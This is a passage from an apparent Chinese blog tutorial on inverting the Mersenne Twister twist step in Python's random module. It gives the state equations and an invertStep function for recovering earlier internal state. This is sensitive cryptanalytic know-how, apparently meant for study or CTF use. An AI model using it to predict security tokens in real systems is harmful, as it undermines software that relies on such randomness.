的生成是通过<code>mt[623]</code>和<code>mt[0]</code>的组合</li><li><code>mt[N-1] = mt[M-1] ^ (y &gt;&gt; 1) ^ mag01[y &amp; 0x1U];</code>这一步又回绕到第397个元素（<code>mt[M-1] = mt[396]</code>）</li></ul></li></ul><p>我们将<code>(y &gt;&gt; 1) ^ mag01[y &amp; 0x1U]</code>这一部分称为 twist 过程，我们将其变为双变量函数的形式以便于我们理解：</p><p>注：<code>x</code>表示mt[kk]，<code>y</code>表示mt[kk+1]</p><script type="math/tex; mode=display">f(x)=\left\{\begin{array}{ll}((x \& 0 \mathrm{x} 80000000) \mid(y \& 0 \mathrm{x} 7 \mathrm{fffffff})) \gg 1 & y \& 1=0 \\(((x \& 0 \mathrm{x} 80000000) \mid(y \& 0 \mathrm{x} 7 \mathrm{ffffff})) \gg 1) \oplus 0 \mathrm{x} 9908b0df & y \& 1=1\end{array}\right.</script><p>接下来令初始状态为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.14ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 504 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g></g></g></svg></mjx-container>，当前状态为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="1.459ex" height="1.645ex" role="img" focusable="false" viewbox="0 -705 645 727"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g></g></g></svg></mjx-container>，我们可从初始状态推出完整的内部更新过程：</p><script type="math/tex; mode=display">\begin{aligned}S_{i} & =I_{i+397} \oplus f\left(I_{i}, I_{i+1}\right) & \forall i \in[0,226] \qquad (1)\\ S_{j} & =S_{j-227} \oplus f\left(I_{j}, I_{j+1}\right) & \forall j \in[227,622] \qquad (2)\\S_{623} & =S_{396} \oplus f\left(I_{623}, S_{0}\right) & \qquad(3)\end{aligned}</script><p>注意到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="2.891ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 1278 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container>中</p><script type="math/tex; mode=display">S_{227}=S_0\oplus f(I_{227},I_{228}) \\S_{227}\oplus S_0=f(I_{227},I_{228})</script><p>很明显 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.413ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2834.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(1955.7,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(2445.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container> 主要依赖于 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewbox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container>，如果我们知道了第 228 次生成的输出伪随机数，我们实际上可以：</p><ul><li>恢复出第 227 个状态值的最高有效位</li><li>恢复出第 228 个状态值的低 31 位</li></ul><p>我们这里讨论python中的特别之处，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.244ex" height="2.059ex" role="img" focusable="false" viewbox="0 -705 550 910"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g></g></g></svg></mjx-container> 中的条件异或依赖于<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="3.583ex" height="1.92ex" role="img" focusable="false" viewbox="0 -683 1583.7 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g><g data-mml-node="TeXAtom" transform="translate(473,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"/><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1000,0)"/></g></g></g></g></g></svg></mjx-container>的 LSB</p><p>下面给出进行twist逆转的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">invertStep</span>(<span class="params">si, si227</span>):</span><br><span class="line">    <span class="comment"># S[i] ^ S[i-227] == (((I[i] &amp; 0x80000000) | (I[i+1] &amp; 0x7FFFFFFF)) &gt;&gt; 1) ^ (0x9908b0df if I[i+1] &amp; 1 else 0)</span></span><br><span class="line">    X = si ^ si227</span><br><span class="line">    <span class="comment"># we know the LSB of I[i+1] because MSB of 0x9908b0df is set, we can see if the XOR has been applied</span></span><br><span class="line">    mti1 = (X &amp; <span class="number">0x80000000</span>) &gt;&gt; <span class="number">31</span></span><br><span class="line">    <span class="keyword">if</span> mti1:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line">    <span class="comment"># undo shift right</span></span><br><span class="line">    X &lt;&lt;= <span class="number">1</span></span><br><span class="line">    <span class="comment"># now recover MSB of state I[i]</span></span><br><span class="line">    mti = X &amp; <span class="number">0x80000000</span> </span><br><span class="line">    <span class="comment"># recover the rest of state I[i+1]</span></span><br><span class="line">    mti1 += X &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> mti, mti1</span><br></pre></td></tr></table></figure><blockquote><p><code>random.getstate()</code> 返回一个内部状态元组，其中 <code>[1]</code> 是 Mersenne Twister 的内部状态数组（共 624 + 1 个元素，第一个是 index）</p><p>调用一次 <code>random.random()</code>，这会：</p><ul><li>从当前状态数组中生成一个伪随机数（浮点数）</li><li>并推进 Mersenne Twister 的状态</li><li>如果这次调用跨越了 624 个数字的边界，会触发一次twist</li></ul></blockquote><p>我们解释一下这个代码：</p><ul><li><p>函数需要传入两个状态 $S<em>i<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 1000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">和</text></g></g></g></svg></mjx-container>S</em>{i-227}$</p></li><li><p>还原 twist 使用的 y 值，原公式<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="44.024ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 19458.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mo" transform="translate(645,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/></g><g data-mml-node="mi" transform="translate(923,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(1268,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/></g><g data-mml-node="mo" transform="translate(1823.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mi" transform="translate(2879.6,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mo" transform="translate(3524.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/></g><g data-mml-node="mi" transform="translate(3802.6,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(4369.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mn" transform="translate(5370,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"/><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"/></g><g data-mml-node="mo" transform="translate(6870,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/></g><g data-mml-node="mo" transform="translate(7370.2,0)"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"/></g><g data-mml-node="mo" transform="translate(8370.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mo" transform="translate(8759.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(9148.4,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(9916.2,0)"><g data-mml-node="text"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"/></g><g data-mml-node="text" transform="translate(778,0)"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"/></g></g><g data-mml-node="mn" transform="translate(11750,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="mo" transform="translate(12250,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(12861.2,0)"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"/></g><g data-mml-node="mi" transform="translate(13861.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(14739.4,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(15268.4,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 